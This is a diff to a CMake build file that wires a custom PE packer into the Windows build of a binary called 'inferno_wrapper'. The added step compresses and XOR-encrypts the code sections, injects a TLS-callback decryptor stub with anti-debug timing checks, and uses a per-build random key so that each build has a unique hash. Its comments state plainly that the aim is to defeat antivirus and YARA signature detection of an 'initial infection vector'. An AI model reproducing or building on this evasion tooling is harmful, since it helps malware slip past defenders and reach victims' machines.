@@ -95,6 +95,74 @@ set_target_properties(inferno_wrapper PROPERTIES
 if(WIN32)
     target_compile_definitions(inferno_wrapper PRIVATE _CRT_SECURE_NO_WARNINGS)
     target_link_libraries(inferno_wrapper PRIVATE shell32)
+
+    # ═══════════════════════════════════════════════════════════
+    # Custom PE Packer Integration (Phase 3, ASLR-safe)
+    # ═══════════════════════════════════════════════════════════
+    #
+    # Post-link step: run packer.py on the compiled wrapper PE to:
+    #   - LZ4-compress + XOR-encrypt .text/.rdata sections
+    #   - Inject a TLS callback decryptor stub
+    #   - Preserve ASLR (split .reloc into minimal + saved entries)
+    #   - Randomize binary hash (per-build key + low-entropy padding)
+    #
+    # This defeats static AV/YARA byte-signature matching on the
+    # initial infection vector.
+    #
+    # ── 1. NASM → stub.bin ──────────────────────────────────
+    find_program(NASM nasm)
+    if(NASM_FOUND)
+        set(STUB_BIN "${CMAKE_CURRENT_BINARY_DIR}/packer_stub.bin")
+        add_custom_command(
+            OUTPUT  ${STUB_BIN}
+            COMMAND ${NASM} -f bin -O0 -o "${STUB_BIN}"
+                    "${CMAKE_SOURCE_DIR}/packer/stub.asm"
+            DEPENDS "${CMAKE_SOURCE_DIR}/packer/stub.asm"
+            COMMENT "Assembling packer decryptor stub (stub.asm → stub.bin)"
+            VERBATIM
+        )
+        add_custom_target(packer_stub_target DEPENDS ${STUB_BIN})
+        add_dependencies(inferno_wrapper packer_stub_target)
+    else()
+        set(STUB_BIN "${CMAKE_SOURCE_DIR}/packer/stub.bin")
+        message(STATUS "NASM not found — using pre-compiled packer/stub.bin")
+    endif()
+
+    # ── 2. Per-build XOR key ───────────────────────────────
+    # Every invocation of cmake generates a fresh 32-byte hex key,
+    # guaranteeing a unique packed binary hash per build.
+    string(RANDOM LENGTH 32 ALPHABET "0123456789abcdef" INFERNO_PACKER_KEY)
+    message(STATUS "Packer XOR key: ${INFERNO_PACKER_KEY}")
+
+    # ── 3. CI-friendly option ─────────────────────────────
+    # rdtsc timing anti-debug can false-positive in sandboxed CI
+    # runners. Set -DINFERNO_PACKER_QUICK=ON in CI to skip it.
+    option(INFERNO_PACKER_QUICK
+        "Skip anti-debug checks in packer stub (use in CI/sandbox)" OFF)
+
+    # ── 4. Post-link packer step ───────────────────────────
+    # Write to a .packed temp file, then atomically rename to
+    # prevent corrupting the binary if packer.py crashes.
+    set(PACKER_ARGS
+        "--input" "$<TARGET_FILE:inferno_wrapper>"
+        "--output" "$<TARGET_FILE:inferno_wrapper>.packed"
+        "--key" "${INFERNO_PACKER_KEY}"
+        "--verbose"
+    )
+    if(INFERNO_PACKER_QUICK)
+        list(APPEND PACKER_ARGS "--quick")
+    endif()
+
+    add_custom_command(TARGET inferno_wrapper POST_BUILD
+        COMMAND ${Python3_EXECUTABLE}
+                "${CMAKE_SOURCE_DIR}/packer/packer.py"
+                ${PACKER_ARGS}
+        COMMAND ${CMAKE_COMMAND} -E rename
+                "$<TARGET_FILE:inferno_wrapper>.packed"
+                "$<TARGET_FILE:inferno_wrapper>"
+        COMMENT "Packing inferno_wrapper (XOR+LZ4+TLS, key=${INFERNO_PACKER_KEY})"
+        VERBATIM
+    )
 endif()
 
 # --- macOS .app bundle post-build ---
